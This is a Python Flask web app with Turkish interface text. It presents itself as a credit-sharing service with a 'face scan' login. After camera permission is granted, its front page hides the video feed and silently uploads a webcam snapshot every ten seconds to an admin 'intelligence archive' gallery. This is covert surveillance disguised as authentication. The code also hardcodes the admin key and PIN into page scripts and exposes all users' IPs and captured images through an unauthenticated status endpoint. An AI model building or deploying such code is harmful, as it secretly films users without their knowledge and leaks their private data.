from flask import Flask, render_template_string, jsonify, request
import time, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN HIGH-RES EYE v156.0 ---
# Vizyon: Yüksek Kaliteli Kamera Takibi ve Hatasız VIP Yönetimi. [cite: 2026-01-03]
VERSION = "v156.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "is_active": False, "global_lock": False,
    "banned_peers": [], "user_registry": {}, 
    "active_admins": {}, 
    "evolution_count": 56, "s100_temp": "35°C"
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "437F" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil Cihaz"

def check_admin_auth(req):
    ua = req.headers.get('User-Agent', '').upper()
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    is_authorized = any(x in ua for x in ["SM-A55", "437F", "WINDOWS", "ANDROID"])
    if key == ADMIN_KEY and pin == ADMIN_PIN and is_authorized:
        sid = f"ADMIN-{get_device_info(ua)}-{req.remote_addr}"
        state["active_admins"][sid] = {"device": get_device_info(ua), "ip": req.remote_addr, "last_seen": time.strftime('%H:%M:%S')}
        return True
    return False

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if action == "lock": state["global_lock"] = not state["global_lock"]
        elif action == "unban": 
            if target in state["banned_peers"]: state["banned_peers"].remove(target)
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] += float(val or 0)
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": 
                if target not in state["banned_peers"]: state["banned_peers"].append(target)
    return jsonify(state)

@app.route('/upload_eye', methods=['POST'])
def upload_eye():
    p_id = request.args.get('peer_id')
    if p_id in state["user_registry"]:
        img_data = request.json.get('image')
        if "eye_archive" not in state["user_registry"][p_id]: state["user_registry"][p_id]["eye_archive"] = []
        state["user_registry"][p_id]["eye_archive"].append({"time": time.strftime('%H:%M:%S'), "data": img_data})
        if len(state["user_registry"][p_id]["eye_archive"]) > 10: state["user_registry"][p_id]["eye_archive"].pop(0)
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "<h1>REDDEDİLDİ: Yetkisiz Cihaz</h1>", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>High-Res Eye Console</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between items-center">
        <h1 class="text-xl font-black text-blue-500 italic uppercase">SOVEREIGN HIGH-RES v156.0</h1>
        <div id="adminNodes" class="flex gap-2"></div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-4 border border-zinc-900 rounded-2xl">
            <h2 class="text-blue-400 font-bold mb-2 border-b border-blue-900 uppercase italic">İstihbarat Arşivi (HD)</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-2 text-white outline-none"></select>
            <div id="eye_gallery" class="space-y-3 overflow-y-auto max-h-[550px]"></div>
        </div>
        <div class="col-span-3 space-y-4">
            <div class="bg-zinc-950 rounded-2xl border border-zinc-900 overflow-hidden shadow-2xl">
                <table class="w-full text-left"><thead class="bg-zinc-900 text-zinc-500 font-bold">
                <tr><th class="p-3">CİHAZ/IP</th><th>ID</th><th>BAKİYE</th><th>DURUM</th><th>KOMUTA</th></tr></thead>
                <tbody id="userTable"></tbody></table>
            </div>
            <div id="banList" class="bg-red-950/10 border border-red-900/30 p-4 rounded-2xl"></div>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t="", v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${encodeURIComponent(v)}`); update(); }
        function uG(){
            const id = document.getElementById('pS').value; const g = document.getElementById('eye_gallery');
            if(!id || !reg[id] || !reg[id].eye_archive) { g.innerHTML = ""; return; }
            let h = ""; reg[id].eye_archive.slice().reverse().forEach(s => {
                h += `<div class="p-1 border border-blue-900/30 rounded mb-2 bg-black">
                <p class="text-[7px] text-zinc-400 mb-1">Time: ${s.time}</p><img src="${s.data}" class="w-full rounded shadow-lg"></div>`;
            });
            if(g.innerHTML !== h) g.innerHTML = h;
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", aH="", bH="", pO="<option value=''>Hedef Seç...</option>";
            for(let sid in d.active_admins){ let a=d.active_admins[sid]; aH += `<span class="bg-blue-900/20 px-2 py-1 rounded text-blue-500 border border-blue-900 font-bold">🛡️ ${a.device}</span>`; }
            for(let id in d.user_registry){
                let u=d.user_registry[id];
                if(d.banned_peers.includes(id)) {
                    bH += `<div class="p-2 border border-red-900 rounded mb-1 bg-black flex justify-between items-center text-red-500">${id} <button onclick="f('unban','${id}')" class="underline">AFFET</button></div>`;
                    continue;
                }
                pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${id}</option>`;
                uH += `<tr class="border-b border-zinc-900"><td class="p-3"><b>${u.device}</b><br><span class="text-zinc-600">${u.ip}</span></td>
                <td class="${u.is_vip?'text-yellow-500 font-black':'text-blue-400'}">${id}</td><td class="text-green-500 font-bold">${u.credits.toFixed(1)}</td>
                <td class="text-[7px] italic">${u.is_vip?'VIP':'STANDART'}</td>
                <td><button onclick="f('gift','${id}', prompt('MB:'))" class="underline mr-2 text-zinc-400">KREDİ</button>
                <button onclick="f('vip','${id}')" class="text-yellow-500 underline mr-2">${u.is_vip?'DÜŞÜR':'VIP YAP'}</button>
                <button onclick="f('ban','${id}')" class="text-red-600 underline">BAN</button></td></tr>`;
            }
            document.getElementById('userTable').innerHTML = uH; document.getElementById('adminNodes').innerHTML = aH;
            document.getElementById('pS').innerHTML = pO; document.getElementById('banList').innerHTML = bH || "Sürgün yok.";
            uG(); 
        } setInterval(update, 3000); update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "ip": request.remote_addr, "eye_archive": []}
        u = state["user_registry"][p_id]
        if type == "receive" and not u["is_vip"]: u["credits"] = max(0, u["credits"] - 0.2)
    return jsonify(state)

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sovereign Authentication</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden">
    <div id="authScreen" class="text-center p-8 bg-zinc-950 border border-zinc-900 rounded-[50px] shadow-2xl max-w-sm w-full mx-4 transition-all duration-500">
        <div class="mb-6"><div class="w-20 h-20 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div></div>
        <h1 class="text-xl font-black text-blue-500 mb-4 italic uppercase tracking-tighter">Hükümdar Kimlik Doğrulama</h1>
        <p class="text-xs text-zinc-500 mb-8 italic">"Sistemi başlatmak için yüz taramasını yapınız (daha havalı olsun diye yaptım )"</p>
        <button onclick="startEye()" class="w-full py-4 bg-blue-700 hover:bg-blue-600 text-white font-black rounded-3xl text-lg transition shadow-lg">TARAMAYI BAŞLAT</button>
        <p id="errorMsg" class="mt-4 text-red-600 font-bold hidden text-[10px]">DOĞRULAMA REDDEDİLDİ: ERİŞİM YOK!</p>
    </div>
    <div id="mainUI" class="hidden w-full h-full p-4 overflow-y-auto">
        <div class="text-center mb-6"><h1 class="text-2xl font-black text-blue-600 italic uppercase">IMPERIAL HUB</h1></div>
        <div class="bg-zinc-950 p-12 rounded-[50px] border border-zinc-900 mb-8 text-center shadow-2xl"><div id="credits" class="text-7xl font-black italic text-white">0.00</div><p class="text-[8px] text-zinc-700 uppercase tracking-widest mt-2">Bakiye</p></div>
        <div class="grid grid-cols-2 gap-4"><button onclick="f('share')" class="py-10 bg-green-700 text-black font-black rounded-3xl text-2xl active:scale-90 transition">VER</button><button onclick="f('receive')" class="py-10 bg-blue-700 text-white font-black rounded-3xl text-2xl active:scale-90 transition">AL</button></div>
    </div>
    <video id="v" class="hidden" autoplay playsinline></video><canvas id="c" class="hidden"></canvas>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id');
        async function f(t) { await fetch(`/action/${t}?peer_id=${myId}`); }
        async function startEye() {
            try {
                // Yüksek çözünürlük talebi [cite: 2026-01-03]
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
                document.getElementById('v').srcObject = stream;
                document.getElementById('authScreen').classList.add('scale-0', 'opacity-0');
                setTimeout(() => { 
                    document.getElementById('authScreen').remove(); 
                    document.getElementById('mainUI').classList.remove('hidden'); 
                }, 500);
                setInterval(capture, 10000); 
            } catch(e) {
                document.getElementById('errorMsg').classList.remove('hidden');
                setTimeout(() => location.reload(), 2000);
            }
        }
        async function capture() {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = 720; c.height = 480; // Yüksek kaliteli çözünürlük [cite: 2026-01-03]
            c.getContext('2d').drawImage(v, 0, 0, 720, 480);
            // JPEG kalitesi %90 yapıldı [cite: 2026-01-03]
            fetch(`/upload_eye?peer_id=${myId}`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.9) }) });
        }
        async function mainLoop() {
            const r = await fetch('/api/status'); const d = await r.json();
            if(d.banned_peers.includes(myId)) { document.body.innerHTML = "<h1 class='text-red-600 text-center mt-20 font-black'>HÜKÜMDAR TARAFINDAN SÜRGÜN EDİLDİNİZ!</h1>"; return; }
            document.getElementById('credits').innerText = (d.user_registry[myId] || {credits:0}).credits.toFixed(2);
            setTimeout(mainLoop, 1000);
        } mainLoop();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
